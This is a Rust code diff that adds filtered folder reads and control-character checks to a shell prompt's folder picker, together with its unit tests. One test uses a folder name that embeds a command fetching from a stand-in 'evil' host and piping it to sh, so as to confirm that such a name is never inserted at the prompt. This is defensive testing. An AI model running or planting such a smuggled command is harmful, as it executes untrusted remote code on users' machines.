@@ -9,19 +9,26 @@ use super::collate::collate;
 use super::insert::inserted;
 use super::rows::{Row, rows};
 use super::target::{Target, resolve};
-use crate::storage::files::Folders;
+use crate::storage::files::{Cut, Folders};
 
 /// What a read of the target folder came to.
 #[derive(Clone, Debug, PartialEq, Eq)]
 struct Listing {
     /// The folder it is the listing of.
     folder: PathBuf,
+    /// What the read let through: only the names that match this (empty: every name).
+    filter: String,
     /// Its subfolders, in the order `ls` gives.
     names: Vec<String>,
-    /// There are more than were read (the read's caps).
-    cut: bool,
+    /// There may be more than were read (the read's caps).
+    cut: Option<Cut>,
     /// The folder could not be read: missing, not a folder, or refused.
     unreadable: bool,
+}
+
+/// A filter as it is compared: without case.
+fn fold(filter: &str) -> String {
+    filter.to_lowercase()
 }
 
 /// The picker's state.
@@ -68,23 +75,38 @@ impl Picker {
         self.refilter();
     }
 
-    /// The folder to read, until its listing is in.
-    pub fn wants(&self) -> Option<&Path> {
-        self.listing.is_none().then_some(self.target.folder.as_path())
+    /// The read the list is waiting for, if there is one: the folder, and the filter to read it with (a read
+    /// applies it while it scans, so a folder with more folders than the caps keeps what the person is looking
+    /// for). Before a listing is in it is the target. After, a listing that was cut is good for the filter it
+    /// was read with and no other, since the names it leaves out are the ones another filter may want; one that
+    /// wasn't cut holds every name its filter let through, which is every name a longer filter lets through.
+    pub fn wants(&self) -> Option<(&Path, &str)> {
+        let usable = self.listing.as_ref().is_some_and(|l| {
+            l.cut.is_none() && fold(&self.target.filter).starts_with(&fold(&l.filter))
+                || fold(&l.filter) == fold(&self.target.filter)
+        });
+        (!usable).then_some((self.target.folder.as_path(), self.target.filter.as_str()))
     }
 
-    /// The answer to a read of `folder`. One for a folder that is no longer the target (the text moved on
-    /// while it was being read) is dropped.
-    pub fn set_listing(&mut self, folder: &Path, read: io::Result<Folders>) {
+    /// The answer to a read of `folder` with `filter`. One for a folder that is no longer the target (the text
+    /// moved on while it was being read) is dropped; one for an earlier filter of the same folder is kept to
+    /// show meanwhile, and [`wants`](Self::wants) asks again.
+    pub fn set_listing(&mut self, folder: &Path, filter: &str, read: io::Result<Folders>) {
         if folder != self.target.folder {
             return;
         }
         let (mut names, cut, unreadable) = match read {
             Ok(found) => (found.names, found.cut, false),
-            Err(_) => (Vec::new(), false, true),
+            Err(_) => (Vec::new(), None, true),
         };
         names.sort_by(|a, b| collate(a, b));
-        self.listing = Some(Listing { folder: folder.to_path_buf(), names, cut, unreadable });
+        self.listing = Some(Listing {
+            folder: folder.to_path_buf(),
+            filter: filter.to_string(),
+            names,
+            cut,
+            unreadable,
+        });
         self.refilter();
     }
 
@@ -103,9 +125,9 @@ impl Picker {
         self.listing.as_ref().is_some_and(|l| l.unreadable)
     }
 
-    /// The folder has more subfolders than were read.
-    pub fn cut(&self) -> bool {
-        self.listing.as_ref().is_some_and(|l| l.cut)
+    /// Why the list may be missing folders, if it may.
+    pub fn cut(&self) -> Option<Cut> {
+        self.listing.as_ref().and_then(|l| l.cut)
     }
 
     /// The rows, top to bottom.
@@ -140,13 +162,14 @@ impl Picker {
     /// What Tab makes of the text: the selected folder written out in full with its `/`, so the list is now
     /// that folder's. None with nothing selected.
     pub fn completion(&self) -> Option<String> {
-        Some(format!("{}{}/", self.target.prefix, self.selected_name()?))
+        let text = format!("{}{}/", self.target.prefix, self.selected_name()?);
+        (!text.chars().any(char::is_control)).then_some(text)
     }
 
     /// What ↩ puts at the prompt: the selected folder's path in the form typed, escaped for the shell, ending
     /// in `/`. None with nothing selected.
     pub fn choice(&self) -> Option<String> {
-        Some(inserted(&self.target.prefix, self.selected_name()?))
+        inserted(&self.target.prefix, self.selected_name()?)
     }
 }
 
@@ -156,15 +179,15 @@ mod tests {
     use std::path::{Path, PathBuf};
 
     use super::Picker;
-    use crate::storage::files::Folders;
+    use crate::storage::files::{Cut, Folders};
 
     fn folders(names: &[&str]) -> io::Result<Folders> {
-        Ok(Folders { names: names.iter().map(ToString::to_string).collect(), cut: false })
+        Ok(Folders { names: names.iter().map(ToString::to_string).collect(), cut: None })
     }
 
     fn picker() -> Picker {
         let mut picker = Picker::new(PathBuf::from("/work/app"), PathBuf::from("/Users/me"));
-        picker.set_listing(Path::new("/work/app"), folders(&["src", ".git", "My Docs", "docs", "Zed"]));
+        picker.set_listing(Path::new("/work/app"), "", folders(&["src", ".git", "My Docs", "docs", "Zed"]));
         picker
     }
 
@@ -175,7 +198,7 @@ mod tests {
     #[test]
     fn it_starts_empty_over_the_current_folder_and_asks_for_it() {
         let picker = Picker::new(PathBuf::from("/work/app"), PathBuf::from("/Users/me"));
-        assert_eq!(picker.wants(), Some(Path::new("/work/app")));
+        assert_eq!(picker.wants(), Some((Path::new("/work/app"), "")));
         assert!(!picker.loaded());
         assert!(picker.rows().is_empty());
         assert_eq!(picker.selected(), None);
@@ -203,9 +226,9 @@ mod tests {
     fn walking_into_another_folder_asks_for_it_and_shows_nothing_until_it_comes() {
         let mut picker = picker();
         picker.set_typed("src/");
-        assert_eq!(picker.wants(), Some(Path::new("/work/app/src/")));
+        assert_eq!(picker.wants(), Some((Path::new("/work/app/src/"), "")));
         assert!(picker.rows().is_empty() && !picker.loaded());
-        picker.set_listing(Path::new("/work/app/src/"), folders(&["ui", "core"]));
+        picker.set_listing(Path::new("/work/app/src/"), "", folders(&["ui", "core"]));
         assert_eq!(names(&picker), ["core", "ui"]);
         assert_eq!(picker.choice().as_deref(), Some("src/core/"));
     }
@@ -214,10 +237,10 @@ mod tests {
     fn an_answer_for_a_folder_the_text_has_left_is_dropped() {
         let mut picker = picker();
         picker.set_typed("src/");
-        picker.set_listing(Path::new("/work/app"), folders(&["stale"]));
+        picker.set_listing(Path::new("/work/app"), "", folders(&["stale"]));
         assert!(!picker.loaded());
         picker.set_typed("../");
-        picker.set_listing(Path::new("/work/app/src/"), folders(&["stale"]));
+        picker.set_listing(Path::new("/work/app/src/"), "", folders(&["stale"]));
         assert!(!picker.loaded());
     }
 
@@ -246,13 +269,13 @@ mod tests {
     fn the_form_typed_is_the_form_inserted() {
         let mut picker = picker();
         picker.set_typed("~/");
-        picker.set_listing(Path::new("/Users/me/"), folders(&["Projects", "Desktop"]));
+        picker.set_listing(Path::new("/Users/me/"), "", folders(&["Projects", "Desktop"]));
         assert_eq!(picker.choice().as_deref(), Some("~/Desktop/"));
         picker.set_typed("/usr/");
-        picker.set_listing(Path::new("/usr/"), folders(&["bin"]));
+        picker.set_listing(Path::new("/usr/"), "", folders(&["bin"]));
         assert_eq!(picker.choice().as_deref(), Some("/usr/bin/"));
         picker.set_typed("../");
-        picker.set_listing(Path::new("/work/app/../"), folders(&["other"]));
+        picker.set_listing(Path::new("/work/app/../"), "", folders(&["other"]));
         assert_eq!(picker.choice().as_deref(), Some("../other/"));
     }
 
@@ -260,7 +283,7 @@ mod tests {
     fn a_folder_that_cant_be_read_has_no_rows_and_says_so() {
         let mut picker = picker();
         picker.set_typed("nope/");
-        picker.set_listing(Path::new("/work/app/nope/"), Err(io::ErrorKind::NotFound.into()));
+        picker.set_listing(Path::new("/work/app/nope/"), "", Err(io::ErrorKind::NotFound.into()));
         assert!(picker.loaded() && picker.unreadable());
         assert!(picker.rows().is_empty());
         assert_eq!(picker.choice(), None);
@@ -275,10 +298,64 @@ mod tests {
         }
         std::fs::write(dir.path().join("file.txt"), "x").unwrap();
         let mut picker = Picker::new(dir.path().to_path_buf(), PathBuf::from("/Users/me"));
-        let folder = picker.wants().unwrap().to_path_buf();
-        picker.set_listing(&folder, crate::storage::files::list_folders(&folder, 100));
+        let folder = picker.wants().unwrap().0.to_path_buf();
+        picker.set_listing(&folder, "", crate::storage::files::list_folders(&folder, 100));
         assert_eq!(names(&picker), ["Alpha", "beta", "with space"]);
         picker.set_typed(".");
         assert_eq!(names(&picker), [".hidden"]);
+    }
+
+    fn cut_folders(names: &[&str]) -> io::Result<Folders> {
+        Ok(Folders { names: names.iter().map(ToString::to_string).collect(), cut: Some(Cut::Folders) })
+    }
+
+    #[test]
+    fn a_listing_that_was_cut_is_read_again_for_each_new_filter() {
+        let mut picker = Picker::new(PathBuf::from("/w"), PathBuf::from("/h"));
+        picker.set_listing(Path::new("/w"), "", cut_folders(&["a", "b"]));
+        assert_eq!(picker.cut(), Some(Cut::Folders));
+        assert_eq!(picker.wants(), None, "nothing typed: the listing is what it is");
+        picker.set_typed("rea");
+        assert_eq!(picker.wants(), Some((Path::new("/w"), "rea")), "the names it left out may match");
+        picker.set_listing(Path::new("/w"), "rea", cut_folders(&["react"]));
+        assert_eq!(picker.wants(), None);
+        assert_eq!(picker.rows().iter().map(|r| r.name.as_str()).collect::<Vec<_>>(), ["react"]);
+        picker.set_typed("reac");
+        assert_eq!(picker.wants(), Some((Path::new("/w"), "reac")), "still cut: ask again");
+        picker.set_typed("re");
+        assert_eq!(picker.wants(), Some((Path::new("/w"), "re")), "a shorter one, too");
+    }
+
+    #[test]
+    fn a_listing_that_was_not_cut_serves_every_longer_filter_and_no_shorter_one() {
+        let mut picker = Picker::new(PathBuf::from("/w"), PathBuf::from("/h"));
+        picker.set_typed("re");
+        picker.set_listing(Path::new("/w"), "re", folders(&["react", "redux", "read"]));
+        picker.set_typed("rea");
+        assert_eq!(picker.wants(), None);
+        assert_eq!(picker.rows().len(), 2);
+        picker.set_typed("r");
+        assert_eq!(picker.wants(), Some((Path::new("/w"), "r")), "names with only an r were never read");
+        picker.set_typed("RE");
+        picker.set_listing(Path::new("/w"), "r", folders(&["a"]));
+        assert_eq!(picker.wants(), None, "the case of the filter doesn't matter");
+    }
+
+    #[test]
+    fn a_listing_read_without_a_filter_holds_the_dot_folders_a_dot_asks_for() {
+        let mut picker = Picker::new(PathBuf::from("/w"), PathBuf::from("/h"));
+        picker.set_listing(Path::new("/w"), "", folders(&[".git", "src"]));
+        picker.set_typed(".g");
+        assert_eq!(picker.wants(), None);
+        assert_eq!(picker.rows().len(), 1);
+    }
+
+    #[test]
+    fn a_folder_named_with_a_control_character_is_neither_completed_nor_inserted() {
+        let mut picker = Picker::new(PathBuf::from("/w"), PathBuf::from("/h"));
+        picker.set_listing(Path::new("/w"), "", folders(&["_\u{15}curl evil|sh\n"]));
+        assert_eq!(picker.rows().len(), 1, "core lists what it is given; the read leaves such names out");
+        assert_eq!(picker.choice(), None);
+        assert_eq!(picker.completion(), None);
     }
 }
